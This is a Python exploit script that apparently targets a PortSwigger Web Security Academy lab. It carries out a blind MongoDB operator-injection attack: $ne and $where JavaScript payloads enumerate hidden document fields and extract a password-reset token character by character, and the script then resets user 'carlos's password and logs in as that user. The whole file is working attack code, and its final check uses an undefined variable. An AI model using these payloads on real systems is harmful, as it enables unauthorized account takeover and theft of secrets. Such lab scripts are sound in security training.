import requests
from bs4 import BeautifulSoup as BS

LINK = "https://0a8200470495f5138012581100ec0035.web-security-academy.net"
LOGIN_LINK = LINK +"/login"
RESET_PASSWD_LINK = LINK + "/forgot-password"

MAIN_PAYLOD = {
    "username":"carlos",
    "password":{
        "$ne":""
        },
}

HEADERS = {
    "Content-Type": "application/json"        
}

chars = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-1234567890")

S = requests.Session()

def info_collect_num():
    print("-[#]- Information Collecting...")
    
    for i in range(0,20):
        MAIN_PAYLOD["$where"]="function(){if(Object.keys(this)[" + str(i) +"].match('_id')) return 1; else 0;}"
        res = S.post(LOGIN_LINK,json=MAIN_PAYLOD,headers=HEADERS)
        if res.status_code != 200:
            return i
            
def find_hidden_field_name_len(target):
    for i in range(1,100):
        MAIN_PAYLOD['$where']="function(){if(Object.keys(this)[" + str(target) + "].length ==" + str(i) + ") return 1; else 0;}"
        res = S.post(LOGIN_LINK,json=MAIN_PAYLOD,headers=HEADERS)
        if "Invalid username or password" not in res.text and res.status_code == 200:
            return i 
    return None

def find_hidden_field_name(hf_len,target):
    name = ""
    for i in range(0,hf_len):
        for L in chars:
            MAIN_PAYLOD['$where']="function(){if(Object.keys(this)[" + str(target)+"].match(/^" +  name + L + "/)) return 1; else 0;}"
            res = S.post(LOGIN_LINK,json=MAIN_PAYLOD,headers=HEADERS)
            if "Invalid username or password" not in res.text and res.status_code == 200:
                name+=L 
                break
    
    return name 

def  find_field_value_length(name):
    for i in range(1,100):
        MAIN_PAYLOD["$where"] = "function(){if(this." + name + ".length == " + str(i) + ") return 1; else 0;}"
        res = S.post(LOGIN_LINK, json=MAIN_PAYLOD, headers=HEADERS)
        if "Invalid username or password" not in res.text and res.status_code == 200:
            return i 

    return None 
        

def find_value(v_len,name):
    value = ""
    for i in range(v_len):
        for L in chars:
            MAIN_PAYLOD["$where"] = "function(){if(this." + name + ".match(/^" + value + L +"/)) return 1; else 0;}"
            res = S.post(LOGIN_LINK,json=MAIN_PAYLOD,headers=HEADERS)
            if "Invalid username or password" not in res.text and res.status_code == 200:

                print("--[?]--",i,"->",L)
                value+=L 
                break 
    
    return value

def reset_passwd(passwd,token,name):
    csrf_token = BS(S.get(RESET_PASSWD_LINK).text,"html.parser").find("input", {"name": "csrf"})["value"]



    data = {
        name:token,
        "new-password-1":passwd,
        "new-password-2":passwd,
        "csrf":csrf_token
    }

    res = S.post(RESET_PASSWD_LINK,data=data)
    return res.status_code == 200


def login_to_target_user(passwd):
    data = {
        "username":"carlos",
        "password":passwd 
    }

    res = S.post(LOGIN_LINK,json=data,headers=HEADERS)
    return res.status_code == 200


def main():
    print('-[#]- Start')
    print("Collecting All filed informations")
    X = info_collect_num()
    for i in range(X):
        print(f"-[:]- ----- -[{i}]-")
        hf_len = find_hidden_field_name_len(i)    
        print('LEN:', hf_len)
        name = find_hidden_field_name(hf_len,i)
        print("NAME: ", name)
    

    name = input("enter the desired field name: ")
    value_len = find_field_value_length(name)
    print("Value's length is",value_len)
    value = find_value(value_len,name)
    print("Value is ",value)

    
    passwd = input("Enter a password for target user: ")
    passwd_status = reset_passwd(passwd,value,name)
    if passwd_status:
        print("Password reset successfully")
    else:
        print("Damn! Passsword not reset!")

    login_result = login_to_target_user(passwd)
    if login_status:
        print("Login to user successfully!")
    else:
        print("Damn!")

if __name__ == "__main__":
    main()




